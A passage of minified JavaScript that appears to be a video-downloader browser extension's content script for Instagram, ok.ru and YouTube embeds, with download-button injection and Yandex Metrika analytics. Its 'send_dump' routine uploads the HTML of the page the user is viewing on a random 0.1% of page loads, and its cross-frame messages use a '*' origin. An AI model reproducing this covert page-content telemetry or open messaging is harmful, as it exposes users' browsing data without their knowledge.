                    w = video.videoWidth,
                    h = video.videoHeight;
                (canvas.width = video.videoWidth), (canvas.height = video.videoHeight), context.fillRect(0, 0, w, h), context.drawImage(video, 0, 0, w, h);
                return canvas.toDataURL("image/jpeg", 1);
            };
        const ig_lang_detect_getLang = () => {
                const htmlAttrLang = document.querySelector("html").getAttribute("lang");
                return -1 !== ["ru-RU", "uk-UA", "be-BY", "kk-KZ", "ky-KG", "hy-AM", "ka-GE", "az-Latn-AZ"].indexOf(htmlAttrLang) ? "ru" : "en";
            },
            lang_detect_startLangObserver = (getLangFromSettings, setLang) => {
                const html = document.querySelector("html");
                new MutationObserver((mutations) => {
                    mutations.some((mutation) => "attributes" === mutation.type && "lang" === mutation.attributeName && ("autoDetect" === getLangFromSettings() && setLang(ig_lang_detect_getLang()), !0));
                }).observe(html, { attributes: !0 });
            },
            url_checker_serviceUrls = ["^https?:\\/\\/(?:www\\.)instagram\\.com\\/"],
            ig_url_checker_mediaUrls = ["^https?:\\/\\/(?:www\\.)?instagram\\.com\\/(?:p|tv|reel)\\/[^/?#&]+"],
            ig_url_checker_isServiceUrl = (url) => utils_regexp(url_checker_serviceUrls, url),
            ig_url_checker_isServiceMediaUrl = (url) => utils_regexp(ig_url_checker_mediaUrls, url);
        var ig_get_media_id = (url) => {
                const tokens = new URL(url).pathname.split("/");
                return tokens[tokens.length - 2];
            },
            ig_make_canonical_url = (mediaId) => `https://www.instagram.com/p/${mediaId}/`;
        class ig_service_Service extends common {
            constructor() {
                super(),
                    (this.serviceName = "ig"),
                    inject_script(document, "patch-xhr.js", {}),
                    (() => {
                        const handlers = [],
                            events = [],
                            handleEvents = () => {
                                handlers.length ? (handlers.forEach((handler) => events.forEach((event) => handler(event))), events.splice(0)) : events.length > 100 && events.splice(0, 100);
                            },
                            dispatcher = (event) => {
                                event.data.items, events.push(event), handleEvents();
                            };
                        window.addEventListener("message", dispatcher);
                        setTimeout(() => {
                            handlers.length || (events.splice(0), window.removeEventListener("message", dispatcher));
                        }, 1e4);
                    })();
            }
            exactMatch(location) {
                return ig_url_checker_isServiceMediaUrl(location.href);
            }
            async observeGallery() {
                const currentNumber = get_current_page_number();
                currentNumber !== this.currentNumber && ((this.currentNumber = currentNumber), this.eventRouter.emit("updateMediaInfoRequest")), setTimeout(this.observeGallery.bind(this), 1e3);
            }
            async insertDownloadButton() {
                if (this.inserted()) return !1;
                this.observeGallery();
                const modalBodyClassName = this.generatePublicId("modalBodyClassName"),
                    t = document.querySelector("article section._aamu._aat0:not(._aat1)") || document.querySelector("article._ab0- section._aamu._aaz9");
                if (null === t) return window.sendLog({ type: "ig: no container found" }), !1;
                const appButton = this.insertContainer("appButton", t, t.lastChild);
                this.widgetContainer = appButton;
                const modal = this.insertContainer("modal", document.body),
                    tooltip = this.insertContainer("tooltip", document.body),
                    notifications = this.insertContainer("notifications", document.body),
                    dropdown = this.insertContainer("dropdown", document.body),
                    css = utils_minify(
                        `\n      #${appButton.id} {\n        display: flex;\n        flex-direction: row;\n        align-items: center;\n        margin: 8px;\n      }\n      #${dropdown.id},\n      #${tooltip.id} {\n        position: absolute;\n        top: 0;\n        width: 100%;\n        z-index: 9999;\n      }\n      #${notifications.id} {\n        position: fixed;\n        z-index: 9999;\n        display: flex;\n        flex-direction: column-reverse;\n        bottom: 0;\n        height: 0;\n      }\n      #${modal.id} {\n        position: fixed;\n        z-index: 9999;\n        top: 0;\n        width: 100%;\n      }\n      body.${modalBodyClassName} {\n        position: fixed;\n        width: 100%;\n        height: 100%;\n      }\n      body.${modalBodyClassName} #${modal.id} {\n        height: 100%;\n      }\n      body.${modalBodyClassName} #${modal.id},\n      body.${modalBodyClassName}::-webkit-scrollbar {\n        background-color: rgba(0,0,0,0.75);\n      }\n    `
                    ),
                    head = document.head || document.getElementsByTagName("head")[0],
                    style = document.createElement("style"),
                    headObserver = new MutationObserver(() => {
                        head.contains(style) && (headObserver.disconnect(), appButton.setAttribute("style", ""));
                    });
                return (
                    headObserver.observe(head, { attributes: !1, childList: !0, characterData: !1, subtree: !0 }),
                    head.appendChild(style),
                    style.appendChild(document.createTextNode(css)),
                    this.eventRouter.emit("webextIsCreated"),
                    (this.webextObserver = new MutationObserver(() => {
                        window.document.querySelector("#" + appButton.id) || (this.webextObserver.disconnect(), this.eventRouter.emit("webextIsDestroyed"));
                    })),
                    this.webextObserver.observe(document.body, { attributes: !1, childList: !0, characterData: !1, subtree: !0 }),
                    !0
                );
            }
            layoutIsReady() {
                return document.querySelector("article[role=presentation]");
            }
        }
        var ok_generic_snap = function () {
            const video = document.querySelector("video"),
                canvas = document.createElement("canvas"),
                context = canvas.getContext("2d"),
                w = video.videoWidth,
                h = video.videoHeight;
            (canvas.width = video.videoWidth), (canvas.height = video.videoHeight), context.fillRect(0, 0, w, h), context.drawImage(video, 0, 0, w, h);
            return canvas.toDataURL("image/jpeg", 1);
        };
        const ok_generic_lang_detect_getLang = () => {
                const htmlAttrLang = document.querySelector("html").getAttribute("lang");
                return -1 !== ["ru", "be", "uk", "kk", "uz", "az", "tt", "mo", "ka", "hy"].indexOf(htmlAttrLang) ? "ru" : "en";
            },
            ok_generic_lang_detect_startLangObserver = (getLangFromSettings, setLang) => {
                const html = document.querySelector("html");
                new MutationObserver((mutations) => {
                    mutations.some((mutation) => "attributes" === mutation.type && "lang" === mutation.attributeName && ("autoDetect" === getLangFromSettings() && setLang(ok_generic_lang_detect_getLang()), !0));
                }).observe(html, { attributes: !0 });
            };
        var ok_generic_get_media_id = (url) => new URL(url).pathname.split("/").pop(),
            ok_generic_make_canonical_url = (mediaId) => "https://ok.ru/video/" + mediaId;
        const ok_generic_url_checker_mediaUrls = ["^https?:\\/\\/(m\\.)?ok\\.ru\\/video\\/[0-9]+", "^https?:\\/\\/(m\\.)?ok\\.ru\\/live\\/[0-9]+"],
            exclude = [/^https:\/\/ok\.ru\/web/, /^https:\/\/ok\.ru\/videoembed/],
            ok_generic_url_checker_isServiceUrl = (url) => {
                const urlObj = new URL(url),
                    { hostname: hostname } = urlObj;
                return /ok\.ru/.test(hostname) && !exclude.some((regexp) => regexp.test(url));
            },
            ok_generic_url_checker_isServiceMediaUrl = (url) => utils_regexp(ok_generic_url_checker_mediaUrls, url);
        const extractData = (holder) =>
                new Promise((resolve, reject) => {
                    const rawData = holder.getAttribute("data-options");
                    try {
                        const data = JSON.parse(rawData);
                        if (data.flashvars.metadata) (data.flashvars.metadata = JSON.parse(data.flashvars.metadata)), resolve(data);
                        else {
                            if (!data.flashvars.metadataUrl) throw new Error("ok: video info not found");
                            {
                                const xhr = new XMLHttpRequest();
                                (xhr.responseType = "json"),
                                    (xhr.onreadystatechange = () => {
                                        4 === xhr.readyState && (200 === xhr.status ? ((data.flashvars.metadata = xhr.response), resolve(data)) : reject());
                                    }),
                                    (xhr.onerror = reject),
                                    (xhr.timeout = 5e3),
                                    (xhr.ontimeout = reject),
                                    xhr.open("POST", decodeURIComponent(data.flashvars.metadataUrl));
                                const formData = new FormData();
                                formData.append("st.location", "WidgetContent/WidgetContent"), xhr.send(formData);
                            }
                        }
                    } catch (e) {
                        reject(e);
                    }
                }),
            ok_getMediaInfo = async (_, setMediaInfo) => {
                const holders = document.querySelectorAll("div[data-module='OKVideo']");
                if (!holders.length) return;
                const id = ok_generic_get_media_id(window.location.href),
                    sources = (await Promise.all(Array.from(holders).map(extractData))).filter((data) => data).filter((data) => data.flashvars && data.flashvars.metadata.movie.id === id);
                if (!sources.length) return void setTimeout(() => ok_getMediaInfo(_, setMediaInfo), 1e3);
                const data = sources[0],
                    { metadata: metadata } = data.flashvars;
                if (["UPLOADED_ODKL", "YKL", "PARTNER", "LIVE_TV_ODKL", "LIVE_TV_APP"].includes(data.provider)) {
                    const mediaInfo = await (function (metadata) {
                        const expires = Math.floor(Date.now() / 1e3) + 21600,
                            canonicalUrl = ok_generic_make_canonical_url(metadata.movie.id);
                        return 0 === metadata.videos.length
                            ? { id: metadata.ownerMovieId, expires: expires, isLiveStream: !0, title: metadata.movie.title, streams: [], video: [], audio: [], canonicalUrl: canonicalUrl }
                            : new Promise(async (resolve) => {
                                  const streams = metadata.videos.map((video) => {
                                          const { name: name, url: url } = video,
                                              { width: width, height: height } = ((name) => {
                                                  const mapping = {
                                                      mobile: { width: 256, height: 144 },
                                                      lowest: { width: 426, height: 240 },
                                                      low: { width: 640, height: 360 },
                                                      sd: { width: 852, height: 480 },
                                                      hd: { width: 1280, height: 720 },
                                                      full: { width: 1920, height: 1080 },
                                                      quad: { width: 2560, height: 1440 },
                                                      ultra: { width: 3840, height: 2160 },
                                                  };
                                                  return name in mapping ? mapping[name] : void 0;
                                              })(name);
                                          return { title: metadata.movie.title + ".mp4", fps: 30, width: width, height: height, quality: height + "p", mimeType: "video/mp4", type: "mp4", conversionRequired: !1, id: url, url: url };
                                      }),
                                      allChecks = streams.map(async (stream, i) => {
                                          const contentLength = await getContentLength(stream.url);
                                          contentLength ? (streams[i].contentLength = contentLength) : (streams[i] = null);
                                      });
                                  await Promise.all(allChecks);
                                  resolve({ id: metadata.ownerMovieId, isLiveStream: !1, expires: expires, title: metadata.movie.title, streams: streams.filter((stream) => stream), video: [], audio: [], canonicalUrl: canonicalUrl });
                              });
                    })(metadata);
                    (mediaInfo.expires = Date.now() / 1e3 + 21600), setMediaInfo({ mediaInfo: mediaInfo });
                } else console.log("UNKNOWN PROVIDER!!!", data), window.sendLog({ type: "ok_unknown_provider", info: { provider: data.provider } }), setMediaInfo({ mediaInfo: { status: "error" } });
            };
        var get_media_info_ok = ok_getMediaInfo,
            get_player = () => document.querySelector("iframe[src^='https://www.youtube.com/embed/']");
        var utils_queue = {};
        let stopPing = !1;
        const isGVProvider = () => {
            const holders = document.querySelectorAll("div[data-module='OKVideo']");
            if (!holders.length) return !1;
            return ((holder) => {
                const rawData = holder.getAttribute("data-options");
                try {
                    const data = JSON.parse(rawData);
                    return !!data.provider && "USER_YOUTUBE" === data.provider;
                } catch (e) {
                    return !1;
                }
            })(Array.from(holders)[0]);
        };
        var ok_get_media_info = (_, setMediaInfo) => {
            document.querySelector('iframe[src^="https://www.youtube"]') || isGVProvider()
                ? (async (_, setMediaInfo) => {
                      window.addEventListener(
                          "message",
                          function (event) {
                              const { message: message, id: id } = event.data;
                              if ("pong" === message) {
                                  stopPing = !0;
                                  get_player().contentWindow.postMessage({ message: "getMediaInfo" }, "*");
                              }
                              if (
                                  ("stream" === message && id in utils_queue && (utils_queue[id].resolve(event.data.content), delete utils_queue[id]),
                                  "progress" === message && id in utils_queue && utils_queue[id].updater(event.data.progress),
                                  "getTimeout" === message)
                              ) {
                                  const { length: length } = event.data;
                                  get_player().contentWindow.postMessage({ message: "timeout", id: id, timeout: (void 0)(length) }, "*");
                              }
                              if ("mediaInfo" !== event.data.message) return;
                              const { info: recievedInfo } = event.data,
                                  { mediaInfo: mediaInfo } = recievedInfo;
                              setMediaInfo({ mediaInfo: mediaInfo });
                          },
                          !1
                      ),
                          (stopPing = !1);
                      const start = function () {
                          if ((console.log("START PING!!!"), !stopPing)) {
                              const player = get_player();
                              if (!player) return void setTimeout(start, 50);
                              player.contentWindow.postMessage({ message: "ping" }, "*"), setTimeout(start, 50);
                          }
                      };
                      start();
                  })(0, setMediaInfo)
                : get_media_info_ok(_, setMediaInfo);
        };
        const ok_getContent = makeGetContent(!1);
        var downloader_ok = get_local((url, contentLength, onprogress, options) =>
            download_stream(
                url,
                contentLength,
                ((timer, onprogress) => (url, start, end) => {
                    const timeout = timer.getTimeout(end - start + 1);
                    return ok_getContent(`${url}&bytes=${start}-${end || ""}`, timeout, { onprogress: onprogress });
                })(options.timer, onprogress),
                options
            )
        );
        var downloader_gv = function (updater) {
            const player = get_player(),
                info = this,
                { id: id } = info;
            return {
                cancel: () => {
                    get_player().contentWindow.postMessage({ message: "cancel", id: id }, "*");
                },
                stream: new Promise((resolve, reject) => {
                    (utils_queue[id] = { resolve: resolve, reject: reject, updater: updater }), player.contentWindow.postMessage({ message: "download", info: info }, "*");
                }),
            };
        };
        var ok_downloader = function (updater, timer) {
            const { url: url } = this;
            return ((url) => /googlevideo\.com/.test(url))(url) ? downloader_gv.bind(this)(updater) : downloader_ok.bind(this)(updater, timer);
        };
        const service_extractData = (holder) => {
                const rawData = holder.getAttribute("data-options");
                try {
                    const data = JSON.parse(rawData);
                    return data.flashvars.metadata && (data.flashvars.metadata = JSON.parse(data.flashvars.metadata)), data;
                } catch (e) {}
                return null;
            },
            getControls = () => document.querySelector(".html5-vpl_panel_right"),
            getInfoContainer = () => {
                const holders = document.querySelectorAll("div[data-module='OKVideo']"),
                    id = window.location.href.split("/").pop(),
                    records = Array.from(holders).map(service_extractData),
                    sources = Array.from(holders).filter((holder, i) =>
                        ((i) => records[i] && records[i].flashvars && records[i].flashvars.metadata && records[i].flashvars.metadata.movie && records[i].flashvars.metadata.movie.id === id)(i)
                    );
                return sources.length ? sources[0] : null;
            };
        class ok_generic_service_Service extends common {
            waitForSnapContainer() {
                return new Promise((resolve) => {
                    const insert = () => {
                        const controls = getControls();
                        if (controls) {
                            const snapshot = this.insertContainer("snapshot", controls, controls.firstChild);
                            resolve(snapshot);
                        } else setTimeout(insert, 50);
                    };
                    insert();
                });
            }
            exactMatch(location) {
                return ok_generic_url_checker_isServiceMediaUrl(location.href);
            }
            layoutIsReady() {
                const isDataReady = null !== getInfoContainer();
                if (document.querySelector('iframe[src^="https://www.youtube"]')) return isDataReady;
                const controls = getControls();
                return isDataReady && !!controls;
            }
        }
        const service_getScrollContainer = () => document.querySelector(".media-layer.__active");
        class ok_service_Service extends ok_generic_service_Service {
            constructor() {
                super(), (this.serviceName = "ok");
            }
            async insertDownloadButton() {
                if (this.inserted()) return !1;
                const modalBodyClassName = this.generatePublicId("modalBodyClassName"),
                    btnTextId = this.generatePublicId("btnTextId"),
                    t = document.querySelector(".vp-layer-info ul.widget-list li.widget-list_i");
                if (null === t) return window.sendLog({ type: "odnoklassniki: no container found" }), !1;
                const appButton = this.insertContainer("appButton", document.body);
                this.widgetContainer = appButton;
                const buttonContainer = document.createElement("li");
                (buttonContainer.className = "widget-list_i"), buttonContainer.appendChild(appButton), t.parentNode.insertBefore(buttonContainer, t);
                const scrollContainerNode = service_getScrollContainer() || document.body,
                    dropdown = this.insertContainer("dropdown", scrollContainerNode),
                    tooltip = this.insertContainer("tooltip", scrollContainerNode),
                    notifications = this.insertContainer("notifications", document.body),
                    modal = this.insertContainer("modal", document.body);
                let snapshot = "fake_id";
                document.querySelector('iframe[src^="https://www.youtube"]') || (snapshot = await this.waitForSnapContainer());
                const css = utils_minify(
                    `\n      #${appButton.id} {\n        display: flex;\n      }\n      #${snapshot.id} {\n        position: relative;\n        display: inline-block;\n        vertical-align: middle;\n        width: 40px;\n        height: 40px;\n      }\n      #${snapshot.id}:hover svg path {\n        fill: #ee8208;\n      }\n      #${dropdown.id},\n      #${tooltip.id} {\n        position: absolute;\n        top: 0;\n        width: 100%;\n        z-index: 2147483647;\n        text-align: left;\n      }\n      #${notifications.id} {\n        position: fixed;\n        z-index: 9999;\n        display: flex;\n        flex-direction: column-reverse;\n        bottom: 0;\n        height: 0;\n      }\n      #${modal.id} {\n        position: fixed;\n        z-index: 9999;\n        top: 0;\n        width: 100%;\n        text-align: left;\n      }\n      body.${modalBodyClassName} {\n        position: fixed;\n        width: 100%;\n        height: 100%;\n      }\n      body.${modalBodyClassName} #${modal.id} {\n        height: 100%;\n      }\n      body.${modalBodyClassName} #${modal.id},\n      body.${modalBodyClassName}::-webkit-scrollbar {\n        background-color: rgba(0,0,0,0.75);\n      }\n      #${btnTextId} {\n        white-space: nowrap;\n        font-size: 14px;\n      }\n    `
                );
                let style;
                const head = document.head || document.getElementsByTagName("head")[0];
                new MutationObserver(() => {
                    head.contains(style) || (style = this.addStyle(css));
                }).observe(head, { attributes: !1, childList: !0, characterData: !1, subtree: !0 }),
                    (style = this.addStyle(css));
                const setButtonHeight = () => {
                    appButton.setAttribute("style", `height:${t.offsetHeight}px`);
                };
                return setButtonHeight(), new ResizeObserver(setButtonHeight).observe(t), !0;
            }
        }
        const ok_appButtonAlign = "left",
            ok_embed_generic_url_checker_serviceUrls = ["^https:\\/\\/connect\\.ok\\.ru", "^https:\\/\\/ok\\.ru\\/videoembed"],
            ok_embed_generic_url_checker_mediaUrls = ["^https:\\/\\/connect\\.ok\\.ru", "^https:\\/\\/ok\\.ru\\/videoembed"],
            ok_embed_generic_url_checker_isServiceUrl = (url) => utils_regexp(ok_embed_generic_url_checker_serviceUrls, url),
            ok_embed_generic_url_checker_isServiceMediaUrl = (url) => utils_regexp(ok_embed_generic_url_checker_mediaUrls, url);
        var ok_embed_get_media_info = async (url, setMediaInfo) => ok_get_media_info(url, setMediaInfo, ok_downloader);
        const service_eventsHandlers = {};
        class ok_embed_service_Service extends common {
            constructor() {
                if ((super(), (this.hidden = !1), (this.serviceName = "okEmbed"), /^https:\/\/connect\.ok\.ru/.test(window.location.href))) {
                    const receiveMessage = async (evt) => {
                        if (
                            ("ping" === evt.data.message && ((this.hidden = !0), this.widgetContainer && this.widgetContainer.setAttribute("style", "display:none"), evt.source.postMessage({ message: "pong" }, "*")),
                            "getMediaInfo" === evt.data.message)
                        ) {
                            const res = await ok_embed_get_media_info(evt.data.url, !0);
                            evt.source.postMessage({ message: "mediaInfo", videoInfo: res }, "*");
                        }
                        if ("download" === evt.data.message) {
                            const { info: info } = evt.data;
                            if (service_eventsHandlers[info.id]) return;
                            service_eventsHandlers[info.id] = {};
                            const sendProgress = (progress) => {
                                evt.source.postMessage({ message: "progress", progress: progress, id: info.id }, "*");
                            };
                            new timer_Timer("gvEmbed").bindGlobalStats(function () {
                                return src_store.getState().stats[this.serviceName];
                            });
                            const { cancel: cancel, stream: stream } = ok_downloader.bind(info)(sendProgress);
                            service_eventsHandlers[info.id].cancel = cancel;
                            const result = await stream;
                            delete service_eventsHandlers[info.id], evt.source.postMessage({ message: "stream", content: result, id: info.id }, "*");
                        }
                        if ("cancel" === evt.data.message) {
                            const { id: id } = evt.data;
                            service_eventsHandlers[id] && (service_eventsHandlers[id].cancel(), delete service_eventsHandlers[id]);
                        }
                    };
                    window.addEventListener("message", receiveMessage.bind(this), !1);
                }
            }
            exactMatch(location) {
                return ok_embed_generic_url_checker_isServiceMediaUrl(location.href);
            }
            async insertDownloadButton() {
                if (this.inserted()) return !1;
                const t = document.querySelector(".vid-card");
                if (null === t) return !1;
                const appButton = this.insertContainer("appButton", t.parentNode, t);
                this.widgetContainer = appButton;
                const dropdown = this.insertContainer("dropdown", document.body),
                    tooltip = this.insertContainer("tooltip", document.body);
                this.insertContainer("notifications", document.body);
                const snapshot = this.insertContainer("snapshot", document.body);
                snapshot.setAttribute("style", "display:none");
                const cssSnapshot = utils_minify(`\n      #${snapshot.id} {\n        display:none !important;\n      }\n    `);
                this.addStyle(cssSnapshot).setAttribute("data-" + snapshot.id, "true");
                const css = utils_minify(
                    `\n      #${appButton.id} {\n        display: flex;\n        position: absolute;\n        height: 30px;\n        top: 12px;\n        right: 12px;\n        overflow: hidden;\n        padding: 0 10px;\n        border-radius: 15px;\n        z-index: 9999;\n        background-color: rgba(0,0,0,0.7);\n      }\n      #${appButton.id} button:last-child {\n        padding-right: 10px;\n        margin-right: -10px;\n      }\n      #${appButton.id} button svg {\n        transform: scale(0.8);\n      }\n      #${appButton.id} button:hover svg path,\n      #${snapshot.id}:hover svg path {\n        fill: #ee8208;\n      }\n      #${appButton.id} button:hover span {\n        color: #ee8208;\n      }\n      #${appButton.id} button:hover span::after {\n        border-right-color: #ee8208;\n        border-bottom-color: #ee8208;\n      }\n      #${snapshot.id} {\n        position: relative;\n        display: inline-block;\n        vertical-align: middle;\n        width: 40px;\n        height: 40px;\n      }\n      #${dropdown.id},\n      #${tooltip.id} {\n        position: absolute;\n        top: 0;\n        width: 100%;\n        z-index: 9999;\n        text-align: left;\n      }\n    `
                );
                return this.addStyle(css), this.waitForTopContainer(appButton.id, dropdown.id), this.waitForSnapContainer(snapshot.id), !0;
            }
            start() {
                console.log("START!!!"), this.emit("hit"), this.checkLocation();
                const addButton = this.addButton.bind(this);
                this.onLoad.bind(this, addButton)();
            }
            checkLayout(callback) {
                console.log("CHECK LAYOUT!!!"), this.layoutIsReady() ? callback() : setTimeout(this.checkLayout.bind(this, callback), 1e3);
            }
            waitForTopContainer(appButtonId, dropdownId) {
                const vidCard = document.querySelector(".vid-card");
                if (vidCard) {
                    const webext = document.getElementById(appButtonId),
                        vidCardN = vidCard.querySelector(".vid-card_n_w .vid-card_n");
                    if (vidCardN) {
                        new MutationObserver(() => {
                            webext.firstChild && "BUTTON" === webext.firstChild.tagName.toUpperCase() && vidCardN.setAttribute("style", `margin-right: ${webext.offsetWidth + 12}px`);
                        }).observe(webext, { attributes: !1, childList: !0, characterData: !1, subtree: !0 });
                    }
                    const vidCardObserver = new MutationObserver(() => {
                        if (document.querySelector(".html5-vpl")) {
                            vidCardObserver.disconnect();
                            const webextDropdown = document.getElementById(dropdownId),
                                isDropdown = () => webextDropdown.hasChildNodes(),
                                webextInsertBeforeVidCard = () => {
                                    vidCard.parentNode.insertBefore(webext, vidCard);
                                },
                                webextDropdownObserverConfig = { attributes: !1, childList: !0, characterData: !1, subtree: !1 },
                                html5VplTitleS = document.querySelector(".html5-vpl_title.vpl-ani-top .html5-vpl_title_s");
                            if (html5VplTitleS) {
                                const webextInsertBeforeHtml5VplTitleS = () => {
                                    html5VplTitleS.parentNode.insertBefore(webext, html5VplTitleS);
                                };
                                webextInsertBeforeHtml5VplTitleS();
                                const html5VplTitleSSvg = html5VplTitleS.querySelector("svg"),
                                    html5VplTitleSSvgWidth = html5VplTitleSSvg && html5VplTitleSSvg.getAttribute("width"),
                                    webextMarginRight = html5VplTitleSSvgWidth ? parseInt(html5VplTitleSSvgWidth, 10) + 12 : 34;
                                webext.setAttribute("style", utils_minify(`\n            margin: -6px ${webextMarginRight}px 0 0;\n            border-radius: 0;\n            background-color:rgba(0,0,0,0);\n          `));
                                const html5VplTitleL = document.querySelector(".html5-vpl_title.vpl-ani-top .html5-vpl_title_l");
                                html5VplTitleL && html5VplTitleL.setAttribute("style", `margin-right: ${webext.offsetWidth + 12}px`),
                                    new MutationObserver(() => {
                                        isDropdown() ? webextInsertBeforeVidCard() : webextInsertBeforeHtml5VplTitleS();
                                    }).observe(webextDropdown, webextDropdownObserverConfig);
                            } else {
                                const html5VplAcI = document.querySelector(".html5-vpl_ac.vpl-ani-top .html5-vpl_ac_i");
                                if (html5VplAcI) {
                                    const webextInsertBeforeHtml5VplAcI = () => {
                                        html5VplAcI.parentNode.insertBefore(webext, html5VplAcI),
                                            webext.setAttribute(
                                                "style",
                                                utils_minify("\n                position: static;\n                display: inline-flex;\n                vertical-align: top;\n                margin-right: 12px;\n              ")
                                            );
                                    };
                                    webextInsertBeforeHtml5VplAcI(),
                                        new MutationObserver(() => {
                                            isDropdown()
                                                ? (webextInsertBeforeVidCard(), webext.setAttribute("style", utils_minify(`\n                    margin-right: ${html5VplAcI.offsetWidth + 12}px;\n                  `)))
                                                : webextInsertBeforeHtml5VplAcI();
                                        }).observe(webextDropdown, webextDropdownObserverConfig);
                                } else webext.setAttribute("style", "display:none");
                            }
                        }
                    });
                    vidCardObserver.observe(vidCard, { attributes: !1, childList: !0, characterData: !1, subtree: !0 });
                }
            }
            waitForSnapContainer(snapshotId) {
                const vidCard = document.querySelector(".vid-card"),
                    vidCardObserver = new MutationObserver(() => {
                        const html5VplPanelRight = document.querySelector(".html5-vpl_panel_right");
                        if (html5VplPanelRight) {
                            vidCardObserver.disconnect();
                            const snapshot = document.getElementById(snapshotId);
                            html5VplPanelRight.insertBefore(snapshot, html5VplPanelRight.firstChild);
                            const styleSnapshot = document.querySelector(`[data-${snapshotId}]`);
                            styleSnapshot && styleSnapshot.remove();
                        }
                    });
                vidCardObserver.observe(vidCard, { attributes: !1, childList: !0, characterData: !1, subtree: !0 });
            }
            layoutIsReady() {
                if (!(null !== document.querySelector("div[data-module='OKVideo']"))) return !1;
                return document.querySelector(".vid-card");
            }
        }
        const ok_embed_getTheme = () => "dark";
        var integration_modules = () => ({ gv: gv_namespaceObject, gvEmbed: gv_embed_namespaceObject, ig: ig_namespaceObject, ok: services_ok_namespaceObject, okEmbed: ok_embed_namespaceObject });
        class ya_metrika_Counter {
            constructor(settings) {
                (this._id = settings.id), (this.utm = settings.utm);
            }
            reachGoal(_target) {
                const target = "goal://unidownloader.com/" + _target;
                return this._hitExt(target);
            }
            _hitExt(pageUrl) {
                const postData = {};
                pageUrl && (postData["page-url"] = pageUrl);
                const browserInfo = [];
                browserInfo.push("en:utf-8"), browserInfo.push("rn:" + Math.floor(1e6 * Math.random())), (postData["browser-info"] = browserInfo.join(":"));
                const pageRef = `https://${window.location.hostname}/?${this.getUtm()}`;
                return (postData["page-ref"] = pageRef), (postData.charset = "utf-8"), this._sendData(postData);
            }
            getUtm() {
                return Object.keys(this.utm)
                    .map((key) => `${key}=${this.utm[key]}`)
                    .join("&");
            }
            _sendData(data) {
                return new Promise((resolve, reject) => {
                    const params = new URLSearchParams(data).toString(),
                        path = `/watch/${this._id}/1?rn=${Math.floor(1e6 * Math.random())}&${params}`,
                        xhr = new XMLHttpRequest(),
                        url = "https://mc.yandex.ru:443" + path;
                    xhr.open("GET", url, !0),
                        (xhr.onerror = (error) => reject(error)),
                        (xhr.timeout = 1e4),
                        xhr.addEventListener("timeout", (e) => {
                            reject(e);
                        }),
                        (xhr.onload = () => {
                            200 !== xhr.status ? reject() : resolve(!0);
                        });
                    try {
                        xhr.send();
                    } catch (e) {
                        reject(e);
                    }
                });
            }
        }
        var send_daily = async (sendEvent) => {
                const lastLoaded = await index_ext.get("extensionLoaded");
                (!lastLoaded || Date.now() - lastLoaded > 864e5) && (index_ext.set("extensionLoaded", Date.now()), sendEvent({ action: "extension_daily" }));
            },
            send_dump = () => {
                const content = document.getElementById("content");
                window.sendLog({ type: "html dump", info: { dump: content ? content.innerHTML : "div id='content' not found" } }, { probability: 0.001 });
            };
        function _typeof(obj) {
            return (_typeof =
                "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
                    ? function (obj) {
                          return typeof obj;
                      }
                    : function (obj) {
                          return obj && "function" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
                      })(obj);
        }
        function defineProperty_defineProperty(obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }
        function objectSpread_objectSpread(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? Object(arguments[i]) : {},
                    ownKeys = Object.keys(source);
                "function" == typeof Object.getOwnPropertySymbols &&
                    ownKeys.push.apply(
                        ownKeys,
                        Object.getOwnPropertySymbols(source).filter(function (sym) {
                            return Object.getOwnPropertyDescriptor(source, sym).enumerable;
                        })
                    ),
                    ownKeys.forEach(function (key) {
                        defineProperty_defineProperty(target, key, source[key]);
                    });
            }
            return target;
        }
        function _classCallCheck(instance, Constructor) {
            if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
        }
        function _defineProperties(target, props) {
            for (var i = 0; i < props.length; i++) {
                var descriptor = props[i];
                (descriptor.enumerable = descriptor.enumerable || !1), (descriptor.configurable = !0), "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, descriptor.key, descriptor);
            }
        }
        function _createClass(Constructor, protoProps, staticProps) {
            return protoProps && _defineProperties(Constructor.prototype, protoProps), staticProps && _defineProperties(Constructor, staticProps), Object.defineProperty(Constructor, "prototype", { writable: !1 }), Constructor;
        }
        function _assertThisInitialized(self) {
            if (void 0 === self) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return self;
        }
        function _possibleConstructorReturn(self, call) {
            if (call && ("object" === _typeof(call) || "function" == typeof call)) return call;
            if (void 0 !== call) throw new TypeError("Derived constructors may only return object or undefined");
            return _assertThisInitialized(self);
        }
        function _getPrototypeOf(o) {
            return (_getPrototypeOf = Object.setPrototypeOf
                ? Object.getPrototypeOf.bind()
                : function (o) {
                      return o.__proto__ || Object.getPrototypeOf(o);
                  })(o);
        }
        var setPrototypeOf = __webpack_require__(43);
        function _inherits(subClass, superClass) {
            if ("function" != typeof superClass && null !== superClass) throw new TypeError("Super expression must either be null or a function");
            (subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: !0, configurable: !0 } })),
                Object.defineProperty(subClass, "prototype", { writable: !1 }),
                superClass && Object(setPrototypeOf.a)(subClass, superClass);
        }
        var consoleLogger = {
                type: "logger",
                log: function (args) {
                    this.output("log", args);
                },
                warn: function (args) {
                    this.output("warn", args);
                },
                error: function (args) {
                    this.output("error", args);
                },
                output: function (type, args) {
                    console && console[type] && console[type].apply(console, args);
                },
            },
            baseLogger = new ((function () {
                function Logger(concreteLogger) {
                    var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    _classCallCheck(this, Logger), this.init(concreteLogger, options);
                }
                return (
                    _createClass(Logger, [
                        {
                            key: "init",
                            value: function (concreteLogger) {
                                var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                                (this.prefix = options.prefix || "i18next:"), (this.logger = concreteLogger || consoleLogger), (this.options = options), (this.debug = options.debug);
                            },
                        },
                        {
                            key: "setDebug",
                            value: function (bool) {
                                this.debug = bool;
                            },
                        },
                        {
                            key: "log",
                            value: function () {
                                for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                                return this.forward(args, "log", "", !0);
                            },
                        },
                        {
                            key: "warn",
                            value: function () {
